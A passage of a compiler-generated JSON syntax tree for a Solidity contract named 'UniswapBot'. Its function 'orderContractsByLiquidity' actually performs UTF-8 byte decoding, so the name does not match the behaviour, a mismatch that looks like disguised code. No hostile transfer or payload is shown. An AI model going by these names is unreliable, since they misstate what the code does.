																		"id": 523,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": false,
																		"lValueRequested": false,
																		"leftExpression": {
																			"argumentTypes": null,
																			"id": 521,
																			"name": "b",
																			"nodeType": "Identifier",
																			"overloadedDeclarations": [],
																			"referencedDeclaration": 500,
																			"src": "6625:1:0",
																			"typeDescriptions": {
																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			}
																		},
																		"nodeType": "BinaryOperation",
																		"operator": "&",
																		"rightExpression": {
																			"argumentTypes": null,
																			"hexValue": "30783146",
																			"id": 522,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": true,
																			"kind": "number",
																			"lValueRequested": false,
																			"nodeType": "Literal",
																			"src": "6629:4:0",
																			"subdenomination": null,
																			"typeDescriptions": {
																				"typeIdentifier": "t_rational_31_by_1",
																				"typeString": "int_const 31"
																			},
																			"value": "0x1F"
																		},
																		"src": "6625:8:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_uint256",
																			"typeString": "uint256"
																		}
																	},
																	"src": "6619:14:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"id": 525,
																"nodeType": "ExpressionStatement",
																"src": "6619:14:0"
															},
															{
																"expression": {
																	"argumentTypes": null,
																	"id": 528,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": false,
																	"lValueRequested": false,
																	"leftHandSide": {
																		"argumentTypes": null,
																		"id": 526,
																		"name": "length",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 490,
																		"src": "6648:6:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_uint256",
																			"typeString": "uint256"
																		}
																	},
																	"nodeType": "Assignment",
																	"operator": "=",
																	"rightHandSide": {
																		"argumentTypes": null,
																		"hexValue": "32",
																		"id": 527,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": true,
																		"kind": "number",
																		"lValueRequested": false,
																		"nodeType": "Literal",
																		"src": "6657:1:0",
																		"subdenomination": null,
																		"typeDescriptions": {
																			"typeIdentifier": "t_rational_2_by_1",
																			"typeString": "int_const 2"
																		},
																		"value": "2"
																	},
																	"src": "6648:10:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"id": 529,
																"nodeType": "ExpressionStatement",
																"src": "6648:10:0"
															}
														]
													}
												},
												"id": 558,
												"nodeType": "IfStatement",
												"src": "6512:315:0",
												"trueBody": {
													"id": 516,
													"nodeType": "Block",
													"src": "6526:59:0",
													"statements": [
														{
															"expression": {
																"argumentTypes": null,
																"id": 510,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftHandSide": {
																	"argumentTypes": null,
																	"id": 508,
																	"name": "ret",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 476,
																	"src": "6541:3:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"nodeType": "Assignment",
																"operator": "=",
																"rightHandSide": {
																	"argumentTypes": null,
																	"id": 509,
																	"name": "b",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 500,
																	"src": "6547:1:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"src": "6541:7:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"id": 511,
															"nodeType": "ExpressionStatement",
															"src": "6541:7:0"
														},
														{
															"expression": {
																"argumentTypes": null,
																"id": 514,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftHandSide": {
																	"argumentTypes": null,
																	"id": 512,
																	"name": "length",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 490,
																	"src": "6563:6:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"nodeType": "Assignment",
																"operator": "=",
																"rightHandSide": {
																	"argumentTypes": null,
																	"hexValue": "31",
																	"id": 513,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"kind": "number",
																	"lValueRequested": false,
																	"nodeType": "Literal",
																	"src": "6572:1:0",
																	"subdenomination": null,
																	"typeDescriptions": {
																		"typeIdentifier": "t_rational_1_by_1",
																		"typeString": "int_const 1"
																	},
																	"value": "1"
																},
																"src": "6563:10:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"id": 515,
															"nodeType": "ExpressionStatement",
															"src": "6563:10:0"
														}
													]
												}
											},
											{
												"condition": {
													"argumentTypes": null,
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 562,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"argumentTypes": null,
														"id": 559,
														"name": "length",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 490,
														"src": "6886:6:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": ">",
													"rightExpression": {
														"argumentTypes": null,
														"expression": {
															"argumentTypes": null,
															"id": 560,
															"name": "self",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 473,
															"src": "6895:4:0",
															"typeDescriptions": {
																"typeIdentifier": "t_struct$_slice_$24_memory_ptr",
																"typeString": "struct UniswapBot.slice memory"
															}
														},
														"id": 561,
														"isConstant": false,
														"isLValue": true,
														"isPure": false,
														"lValueRequested": false,
														"memberName": "_len",
														"nodeType": "MemberAccess",
														"referencedDeclaration": 21,
														"src": "6895:9:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "6886:18:0",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"falseBody": null,
												"id": 566,
												"nodeType": "IfStatement",
												"src": "6882:59:0",
												"trueBody": {
													"id": 565,
													"nodeType": "Block",
													"src": "6906:35:0",
													"statements": [
														{
															"expression": {
																"argumentTypes": null,
																"hexValue": "30",
																"id": 563,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"kind": "number",
																"lValueRequested": false,
																"nodeType": "Literal",
																"src": "6928:1:0",
																"subdenomination": null,
																"typeDescriptions": {
																	"typeIdentifier": "t_rational_0_by_1",
																	"typeString": "int_const 0"
																},
																"value": "0"
															},
															"functionReturnParameters": 477,
															"id": 564,
															"nodeType": "Return",
															"src": "6921:8:0"
														}
													]
												}
											},
											{
												"body": {
													"id": 613,
													"nodeType": "Block",
													"src": "6987:258:0",
													"statements": [
														{
															"expression": {
																"argumentTypes": null,
																"id": 581,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftHandSide": {
																	"argumentTypes": null,
																	"id": 577,
																	"name": "divisor",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 493,
																	"src": "7002:7:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"nodeType": "Assignment",
																"operator": "=",
																"rightHandSide": {
																	"argumentTypes": null,
																	"commonType": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	},
																	"id": 580,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": false,
																	"lValueRequested": false,
																	"leftExpression": {
																		"argumentTypes": null,
																		"id": 578,
																		"name": "divisor",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 493,
																		"src": "7012:7:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_uint256",
																			"typeString": "uint256"
																		}
																	},
																	"nodeType": "BinaryOperation",
																	"operator": "/",
																	"rightExpression": {
																		"argumentTypes": null,
																		"hexValue": "323536",
																		"id": 579,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": true,
																		"kind": "number",
																		"lValueRequested": false,
																		"nodeType": "Literal",
																		"src": "7022:3:0",
																		"subdenomination": null,
																		"typeDescriptions": {
																			"typeIdentifier": "t_rational_256_by_1",
																			"typeString": "int_const 256"
																		},
																		"value": "256"
																	},
																	"src": "7012:13:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"src": "7002:23:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"id": 582,
															"nodeType": "ExpressionStatement",
															"src": "7002:23:0"
														},
														{
															"expression": {
																"argumentTypes": null,
																"id": 590,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftHandSide": {
																	"argumentTypes": null,
																	"id": 583,
																	"name": "b",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 500,
																	"src": "7040:1:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"nodeType": "Assignment",
																"operator": "=",
																"rightHandSide": {
																	"argumentTypes": null,
																	"commonType": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	},
																	"id": 589,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": false,
																	"lValueRequested": false,
																	"leftExpression": {
																		"argumentTypes": null,
																		"components": [
																			{
																				"argumentTypes": null,
																				"commonType": {
																					"typeIdentifier": "t_uint256",
																					"typeString": "uint256"
																				},
																				"id": 586,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": false,
																				"lValueRequested": false,
																				"leftExpression": {
																					"argumentTypes": null,
																					"id": 584,
																					"name": "word",
																					"nodeType": "Identifier",
																					"overloadedDeclarations": [],
																					"referencedDeclaration": 487,
																					"src": "7045:4:0",
																					"typeDescriptions": {
																						"typeIdentifier": "t_uint256",
																						"typeString": "uint256"
																					}
																				},
																				"nodeType": "BinaryOperation",
																				"operator": "/",
																				"rightExpression": {
																					"argumentTypes": null,
																					"id": 585,
																					"name": "divisor",
																					"nodeType": "Identifier",
																					"overloadedDeclarations": [],
																					"referencedDeclaration": 493,
																					"src": "7052:7:0",
																					"typeDescriptions": {
																						"typeIdentifier": "t_uint256",
																						"typeString": "uint256"
																					}
																				},
																				"src": "7045:14:0",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint256",
																					"typeString": "uint256"
																				}
																			}
																		],
																		"id": 587,
																		"isConstant": false,
																		"isInlineArray": false,
																		"isLValue": false,
																		"isPure": false,
																		"lValueRequested": false,
																		"nodeType": "TupleExpression",
																		"src": "7044:16:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_uint256",
																			"typeString": "uint256"
																		}
																	},
																	"nodeType": "BinaryOperation",
																	"operator": "&",
																	"rightExpression": {
																		"argumentTypes": null,
																		"hexValue": "30784646",
																		"id": 588,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": true,
																		"kind": "number",
																		"lValueRequested": false,
																		"nodeType": "Literal",
																		"src": "7063:4:0",
																		"subdenomination": null,
																		"typeDescriptions": {
																			"typeIdentifier": "t_rational_255_by_1",
																			"typeString": "int_const 255"
																		},
																		"value": "0xFF"
																	},
																	"src": "7044:23:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"src": "7040:27:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"id": 591,
															"nodeType": "ExpressionStatement",
															"src": "7040:27:0"
														},
														{
															"condition": {
																"argumentTypes": null,
																"commonType": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																},
																"id": 596,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftExpression": {
																	"argumentTypes": null,
																	"commonType": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	},
																	"id": 594,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": false,
																	"lValueRequested": false,
																	"leftExpression": {
																		"argumentTypes": null,
																		"id": 592,
																		"name": "b",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 500,
																		"src": "7086:1:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_uint256",
																			"typeString": "uint256"
																		}
																	},
																	"nodeType": "BinaryOperation",
																	"operator": "&",
																	"rightExpression": {
																		"argumentTypes": null,
																		"hexValue": "30784330",
																		"id": 593,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": true,
																		"kind": "number",
																		"lValueRequested": false,
																		"nodeType": "Literal",
																		"src": "7090:4:0",
																		"subdenomination": null,
																		"typeDescriptions": {
																			"typeIdentifier": "t_rational_192_by_1",
																			"typeString": "int_const 192"
																		},
																		"value": "0xC0"
																	},
																	"src": "7086:8:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"nodeType": "BinaryOperation",
																"operator": "!=",
																"rightExpression": {
																	"argumentTypes": null,
																	"hexValue": "30783830",
																	"id": 595,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"kind": "number",
																	"lValueRequested": false,
																	"nodeType": "Literal",
																	"src": "7098:4:0",
																	"subdenomination": null,
																	"typeDescriptions": {
																		"typeIdentifier": "t_rational_128_by_1",
																		"typeString": "int_const 128"
																	},
																	"value": "0x80"
																},
																"src": "7086:16:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_bool",
																	"typeString": "bool"
																}
															},
															"falseBody": null,
															"id": 600,
															"nodeType": "IfStatement",
															"src": "7082:108:0",
															"trueBody": {
																"id": 599,
																"nodeType": "Block",
																"src": "7104:86:0",
																"statements": [
																	{
																		"expression": {
																			"argumentTypes": null,
																			"hexValue": "30",
																			"id": 597,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": true,
																			"kind": "number",
																			"lValueRequested": false,
																			"nodeType": "Literal",
																			"src": "7173:1:0",
																			"subdenomination": null,
																			"typeDescriptions": {
																				"typeIdentifier": "t_rational_0_by_1",
																				"typeString": "int_const 0"
																			},
																			"value": "0"
																		},
																		"functionReturnParameters": 477,
																		"id": 598,
																		"nodeType": "Return",
																		"src": "7166:8:0"
																	}
																]
															}
														},
														{
															"expression": {
																"argumentTypes": null,
																"id": 611,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftHandSide": {
																	"argumentTypes": null,
																	"id": 601,
																	"name": "ret",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 476,
																	"src": "7204:3:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"nodeType": "Assignment",
																"operator": "=",
																"rightHandSide": {
																	"argumentTypes": null,
																	"commonType": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	},
																	"id": 610,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": false,
																	"lValueRequested": false,
																	"leftExpression": {
																		"argumentTypes": null,
																		"components": [
																			{
																				"argumentTypes": null,
																				"commonType": {
																					"typeIdentifier": "t_uint256",
																					"typeString": "uint256"
																				},
																				"id": 604,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": false,
																				"lValueRequested": false,
																				"leftExpression": {
																					"argumentTypes": null,
																					"id": 602,
																					"name": "ret",
																					"nodeType": "Identifier",
																					"overloadedDeclarations": [],
																					"referencedDeclaration": 476,
																					"src": "7211:3:0",
																					"typeDescriptions": {
																						"typeIdentifier": "t_uint256",
																						"typeString": "uint256"
																					}
																				},
																				"nodeType": "BinaryOperation",
																				"operator": "*",
																				"rightExpression": {
																					"argumentTypes": null,
																					"hexValue": "3634",
																					"id": 603,
																					"isConstant": false,
																					"isLValue": false,
																					"isPure": true,
																					"kind": "number",
																					"lValueRequested": false,
																					"nodeType": "Literal",
																					"src": "7217:2:0",
																					"subdenomination": null,
																					"typeDescriptions": {
																						"typeIdentifier": "t_rational_64_by_1",
																						"typeString": "int_const 64"
																					},
																					"value": "64"
																				},
																				"src": "7211:8:0",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint256",
																					"typeString": "uint256"
																				}
																			}
																		],
																		"id": 605,
																		"isConstant": false,
																		"isInlineArray": false,
																		"isLValue": false,
																		"isPure": false,
																		"lValueRequested": false,
																		"nodeType": "TupleExpression",
																		"src": "7210:10:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_uint256",
																			"typeString": "uint256"
																		}
																	},
																	"nodeType": "BinaryOperation",
																	"operator": "|",
																	"rightExpression": {
																		"argumentTypes": null,
																		"components": [
																			{
																				"argumentTypes": null,
																				"commonType": {
																					"typeIdentifier": "t_uint256",
																					"typeString": "uint256"
																				},
																				"id": 608,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": false,
																				"lValueRequested": false,
																				"leftExpression": {
																					"argumentTypes": null,
																					"id": 606,
																					"name": "b",
																					"nodeType": "Identifier",
																					"overloadedDeclarations": [],
																					"referencedDeclaration": 500,
																					"src": "7224:1:0",
																					"typeDescriptions": {
																						"typeIdentifier": "t_uint256",
																						"typeString": "uint256"
																					}
																				},
																				"nodeType": "BinaryOperation",
																				"operator": "&",
																				"rightExpression": {
																					"argumentTypes": null,
																					"hexValue": "30783346",
																					"id": 607,
																					"isConstant": false,
																					"isLValue": false,
																					"isPure": true,
																					"kind": "number",
																					"lValueRequested": false,
																					"nodeType": "Literal",
																					"src": "7228:4:0",
																					"subdenomination": null,
																					"typeDescriptions": {
																						"typeIdentifier": "t_rational_63_by_1",
																						"typeString": "int_const 63"
																					},
																					"value": "0x3F"
																				},
																				"src": "7224:8:0",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint256",
																					"typeString": "uint256"
																				}
																			}
																		],
																		"id": 609,
																		"isConstant": false,
																		"isInlineArray": false,
																		"isLValue": false,
																		"isPure": false,
																		"lValueRequested": false,
																		"nodeType": "TupleExpression",
																		"src": "7223:10:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_uint256",
																			"typeString": "uint256"
																		}
																	},
																	"src": "7210:23:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"src": "7204:29:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"id": 612,
															"nodeType": "ExpressionStatement",
															"src": "7204:29:0"
														}
													]
												},
												"condition": {
													"argumentTypes": null,
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 573,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"argumentTypes": null,
														"id": 571,
														"name": "i",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 568,
														"src": "6970:1:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "<",
													"rightExpression": {
														"argumentTypes": null,
														"id": 572,
														"name": "length",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 490,
														"src": "6974:6:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "6970:10:0",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"id": 614,
												"initializationExpression": {
													"assignments": [
														568
													],
													"declarations": [
														{
															"constant": false,
															"id": 568,
															"mutability": "mutable",
															"name": "i",
															"nodeType": "VariableDeclaration",
															"overrides": null,
															"scope": 614,
															"src": "6958:6:0",
															"stateVariable": false,
															"storageLocation": "default",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															},
															"typeName": {
																"id": 567,
																"name": "uint",
																"nodeType": "ElementaryTypeName",
																"src": "6958:4:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"value": null,
															"visibility": "internal"
														}
													],
													"id": 570,
													"initialValue": {
														"argumentTypes": null,
														"hexValue": "31",
														"id": 569,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"kind": "number",
														"lValueRequested": false,
														"nodeType": "Literal",
														"src": "6967:1:0",
														"subdenomination": null,
														"typeDescriptions": {
															"typeIdentifier": "t_rational_1_by_1",
															"typeString": "int_const 1"
														},
														"value": "1"
													},
													"nodeType": "VariableDeclarationStatement",
													"src": "6958:10:0"
												},
												"loopExpression": {
													"expression": {
														"argumentTypes": null,
														"id": 575,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"nodeType": "UnaryOperation",
														"operator": "++",
														"prefix": false,
														"src": "6982:3:0",
														"subExpression": {
															"argumentTypes": null,
															"id": 574,
															"name": "i",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 568,
															"src": "6982:1:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"id": 576,
													"nodeType": "ExpressionStatement",
													"src": "6982:3:0"
												},
												"nodeType": "ForStatement",
												"src": "6953:292:0"
											},
											{
												"expression": {
													"argumentTypes": null,
													"id": 615,
													"name": "ret",
													"nodeType": "Identifier",
													"overloadedDeclarations": [],
													"referencedDeclaration": 476,
													"src": "7264:3:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"functionReturnParameters": 477,
												"id": 616,
												"nodeType": "Return",
												"src": "7257:10:0"
											}
										]
									},
									"documentation": null,
									"id": 618,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "orderContractsByLiquidity",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 474,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 473,
												"mutability": "mutable",
												"name": "self",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 618,
												"src": "6168:17:0",
												"stateVariable": false,
												"storageLocation": "memory",
												"typeDescriptions": {
													"typeIdentifier": "t_struct$_slice_$24_memory_ptr",
													"typeString": "struct UniswapBot.slice"
												},
												"typeName": {
													"contractScope": null,
													"id": 472,
													"name": "slice",
													"nodeType": "UserDefinedTypeName",
													"referencedDeclaration": 24,
													"src": "6168:5:0",
													"typeDescriptions": {
														"typeIdentifier": "t_struct$_slice_$24_storage_ptr",
														"typeString": "struct UniswapBot.slice"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "6167:19:0"
									},
									"returnParameters": {
										"id": 477,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 476,
												"mutability": "mutable",
												"name": "ret",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 618,
												"src": "6210:8:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 475,
													"name": "uint",
													"nodeType": "ElementaryTypeName",
													"src": "6210:4:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "6209:10:0"
									},
									"scope": 1578,
									"src": "6133:1142:0",
									"stateMutability": "pure",
									"virtual": false,
									"visibility": "internal"
								},
								{
									"body": {
										"id": 705,
										"nodeType": "Block",
										"src": "7534:574:0",
										"statements": [
											{
												"assignments": [
													626
												],
												"declarations": [
													{
														"constant": false,
														"id": 626,
														"mutability": "mutable",
														"name": "ptr",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 705,
														"src": "7545:8:0",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 625,
															"name": "uint",
															"nodeType": "ElementaryTypeName",
															"src": "7545:4:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 631,
												"initialValue": {
													"argumentTypes": null,
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 630,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"argumentTypes": null,
														"expression": {
															"argumentTypes": null,
															"id": 627,
															"name": "self",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 620,
															"src": "7556:4:0",
															"typeDescriptions": {
																"typeIdentifier": "t_struct$_slice_$24_memory_ptr",
																"typeString": "struct UniswapBot.slice memory"
															}
														},
														"id": 628,
														"isConstant": false,
														"isLValue": true,
														"isPure": false,
														"lValueRequested": false,
														"memberName": "_ptr",
														"nodeType": "MemberAccess",
														"referencedDeclaration": 23,
														"src": "7556:9:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "-",
													"rightExpression": {
														"argumentTypes": null,
														"hexValue": "3331",
														"id": 629,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"kind": "number",
														"lValueRequested": false,
														"nodeType": "Literal",
														"src": "7568:2:0",
														"subdenomination": null,
														"typeDescriptions": {
															"typeIdentifier": "t_rational_31_by_1",
															"typeString": "int_const 31"
														},
														"value": "31"
													},
													"src": "7556:14:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "7545:25:0"
											},
											{
												"assignments": [
													633
												],
												"declarations": [
													{
														"constant": false,
														"id": 633,
														"mutability": "mutable",
														"name": "end",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 705,
														"src": "7581:8:0",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 632,
															"name": "uint",
															"nodeType": "ElementaryTypeName",
															"src": "7581:4:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 638,
												"initialValue": {
													"argumentTypes": null,
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 637,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"argumentTypes": null,
														"id": 634,
														"name": "ptr",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 626,
														"src": "7592:3:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "+",
													"rightExpression": {
														"argumentTypes": null,
														"expression": {
															"argumentTypes": null,
															"id": 635,
															"name": "self",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 620,
															"src": "7598:4:0",
															"typeDescriptions": {
																"typeIdentifier": "t_struct$_slice_$24_memory_ptr",
																"typeString": "struct UniswapBot.slice memory"
															}
														},
														"id": 636,
														"isConstant": false,
														"isLValue": true,
														"isPure": false,
														"lValueRequested": false,
														"memberName": "_len",
														"nodeType": "MemberAccess",
														"referencedDeclaration": 21,
														"src": "7598:9:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "7592:15:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "7581:26:0"
											},
											{
												"body": {
													"id": 703,
													"nodeType": "Block",
													"src": "7646:455:0",
													"statements": [
														{
															"assignments": [
																650
															],
															"declarations": [
																{
																	"constant": false,
																	"id": 650,
																	"mutability": "mutable",
																	"name": "b",
																	"nodeType": "VariableDeclaration",
																	"overrides": null,
																	"scope": 703,
																	"src": "7661:7:0",
																	"stateVariable": false,
																	"storageLocation": "default",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint8",
																		"typeString": "uint8"
																	},
																	"typeName": {
																		"id": 649,
																		"name": "uint8",
																		"nodeType": "ElementaryTypeName",
																		"src": "7661:5:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_uint8",
																			"typeString": "uint8"
																		}
																	},
																	"value": null,
																	"visibility": "internal"
																}
															],
															"id": 651,
															"initialValue": null,
															"nodeType": "VariableDeclarationStatement",
															"src": "7661:7:0"
														},
														{
															"AST": {
																"nodeType": "YulBlock",
																"src": "7692:30:0",
																"statements": [
																	{
																		"nodeType": "YulAssignment",
																		"src": "7694:26:0",
																		"value": {
																			"arguments": [
																				{
																					"arguments": [
																						{
																							"name": "ptr",
																							"nodeType": "YulIdentifier",
																							"src": "7709:3:0"
																						}
																					],
																					"functionName": {
																						"name": "mload",
																						"nodeType": "YulIdentifier",
																						"src": "7703:5:0"
																					},
																					"nodeType": "YulFunctionCall",
																					"src": "7703:10:0"
																				},
																				{
																					"kind": "number",
																					"nodeType": "YulLiteral",
																					"src": "7715:4:0",
																					"type": "",
																					"value": "0xFF"
																				}
																			],
																			"functionName": {
																				"name": "and",
																				"nodeType": "YulIdentifier",
																				"src": "7699:3:0"
																			},
																			"nodeType": "YulFunctionCall",
																			"src": "7699:21:0"
																		},
																		"variableNames": [
																			{
																				"name": "b",
																				"nodeType": "YulIdentifier",
																				"src": "7694:1:0"
																			}
																		]
